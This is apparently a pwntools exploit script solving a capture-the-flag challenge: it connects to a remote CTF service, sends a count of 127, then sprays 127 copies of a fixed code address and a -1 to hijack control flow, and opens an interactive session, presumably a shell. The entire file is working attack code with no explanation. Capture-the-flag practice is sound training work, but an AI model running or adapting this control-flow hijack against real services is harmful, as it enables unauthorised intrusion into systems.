#!/usr/bin/env python

from pwn import *

r = remote("csie.ctf.tw", 10121)

addr = '0x08048580'

r.recvuntil(':')
r.sendline('127')
r.recvuntil(':')
r.sendline('{} '.format(str(int(addr, 16))) * 127)
r.recvuntil(':')
r.sendline('-1')
r.interactive()
